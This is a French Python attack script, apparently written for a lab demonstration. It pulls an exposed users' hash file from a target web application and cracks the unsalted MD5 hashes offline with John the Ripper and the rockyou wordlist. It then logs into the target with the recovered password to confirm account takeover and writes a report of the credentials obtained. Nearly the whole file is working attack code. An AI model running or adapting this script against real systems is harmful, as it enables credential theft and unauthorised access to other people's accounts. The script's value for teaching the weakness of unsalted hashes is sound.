"""
POSTE ATTAQUANT
----------------
Prérequis (sur l'ordinateur attaquant, idéalement Kali/Linux) :
    sudo apt install john
    # rockyou.txt : souvent dans /usr/share/wordlists/rockyou.txt.gz sur Kali
    #   sudo gunzip /usr/share/wordlists/rockyou.txt.gz
    pip install requests

Usage :
    python3 attacker.py --target http://IP_DU_CLIENT:5000 --wordlist /usr/share/wordlists/rockyou.txt

Déroulé :
  1. Récupère le fichier de hash exposé par la faille du client (HTTP, instantané).
  2. Lance John the Ripper en local sur l'attaquant avec rockyou -> toute
     la puissance de calcul (CPU multi-coeurs) est utilisée localement,
     aucune limite réseau : on attend des centaines de milliers de
     mots/seconde typiques pour du MD5 non salé avec john.
  3. Récupère le mot de passe cassé, se logue sur le site cible pour
     prouver l'accès au compte.
  4. Écrit un rapport texte avec login, hash, mot de passe, preuve d'accès.
"""

import argparse
import subprocess
import time
import sys
import requests


def recuperer_hash(target_url, out_file="hash_recupere.txt"):
    url = target_url.rstrip("/") + "/backup/users.txt"
    print(f"[*] Récupération du fichier de hash exposé : {url}")
    r = requests.get(url, timeout=5)
    if r.status_code != 200:
        print("[!] Impossible de récupérer le hash (faille non accessible ?)")
        sys.exit(1)
    with open(out_file, "w") as f:
        f.write(r.text)
    print(f"[+] Hash récupéré et enregistré dans {out_file} :")
    print("    " + r.text.strip())
    return out_file


def lancer_john(hash_file, wordlist, fmt="raw-md5", john_bin="john"):
    print(f"[*] Lancement de John the Ripper (format={fmt}, dico={wordlist})")
    debut = time.time()

    # Lance le bruteforce dictionnaire
    subprocess.run(
        [john_bin, f"--format={fmt}", f"--wordlist={wordlist}", hash_file],
        check=False,
    )

    duree = time.time() - debut

    # Récupère le résultat en clair
    result = subprocess.run(
        [john_bin, f"--format={fmt}", "--show", hash_file],
        capture_output=True, text=True
    )
    print("[*] Sortie --show de John :")
    print(result.stdout)

    cracked = None
    for line in result.stdout.splitlines():
        if ":" in line and not line.startswith(("0 password", "1 password")):
            login, pwd = line.split(":", 1)
            cracked = (login, pwd)
            break

    return cracked, duree


def compter_tentatives(wordlist, password):
    """Retourne le rang (= nombre de tentatives) du mot de passe dans le
    dictionnaire, en le recherchant ligne par ligne (même ordre que John)."""
    print(f"[*] Calcul du nombre de tentatives réelles dans {wordlist}...")
    with open(wordlist, "r", encoding="latin-1", errors="ignore") as f:
        for i, ligne in enumerate(f, start=1):
            if ligne.rstrip("\r\n") == password:
                return i
    return None


def se_connecter(target_url, login, password):
    print(f"[*] Tentative de connexion sur {target_url} avec {login}:{password}")
    s = requests.Session()
    r = s.post(target_url, data={"login": login, "password": password}, allow_redirects=True)
    ok = "Accès administrateur confirmé" in r.text
    return ok, r.text


def ecrire_rapport(login, password, duree, acces_ok, tentatives, path="rapport_bruteforce.txt"):
    with open(path, "w", encoding="utf-8") as f:
        f.write("=== RAPPORT DE DEMONSTRATION - BRUTEFORCE DICTIONNAIRE ===\n")
        f.write(f"Login ciblé       : {login}\n")
        f.write(f"Mot de passe trouvé : {password}\n")
        f.write(f"Durée du cassage  : {duree:.4f} secondes\n")
        if tentatives:
            debit = tentatives / duree if duree > 0 else float("inf")
            f.write(f"Nombre de tentatives (rang dans le dico) : {tentatives}\n")
            f.write(f"Débit estimé : {debit:,.0f} mots/seconde\n".replace(",", " "))
        else:
            f.write("Nombre de tentatives : non déterminé (mot absent du dico tel quel)\n")
        f.write(f"Accès compte confirmé : {'OUI' if acces_ok else 'NON'}\n")
    print(f"[+] Rapport écrit dans {path}")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", required=True, help="URL du client, ex: http://192.168.1.10:5000")
    parser.add_argument("--wordlist", required=True, help="Chemin vers rockyou.txt")
    parser.add_argument("--format", default="raw-md5", help="Format de hash John (défaut: raw-md5)")
    parser.add_argument("--john", default="john", help="Chemin vers l'exécutable john (ex: C:\\Users\\Ronan\\Downloads\\john-1.9.0\\john-1.9.0\\run\\john.exe)")
    args = parser.parse_args()

    hash_file = recuperer_hash(args.target)
    cracked, duree = lancer_john(hash_file, args.wordlist, args.format, args.john)

    if not cracked:
        print("[!] Mot de passe non trouvé dans ce dictionnaire.")
        sys.exit(1)

    login, password = cracked
    print(f"\n[+++] MOT DE PASSE TROUVÉ : {login}:{password}  (en {duree:.2f}s)\n")

    acces_ok, _ = se_connecter(args.target, login, password)
    print("[+] Accès au compte confirmé !" if acces_ok else "[!] Connexion échouée malgré le mdp trouvé.")

    tentatives = compter_tentatives(args.wordlist, password)
    if tentatives:
        debit = tentatives / duree if duree > 0 else float("inf")
        print(f"[+] Rang dans le dictionnaire : {tentatives} tentatives")
        print(f"[+] Débit estimé : {debit:,.0f} mots/seconde".replace(",", " "))

    ecrire_rapport(login, password, duree, acces_ok, tentatives)


if __name__ == "__main__":
    main()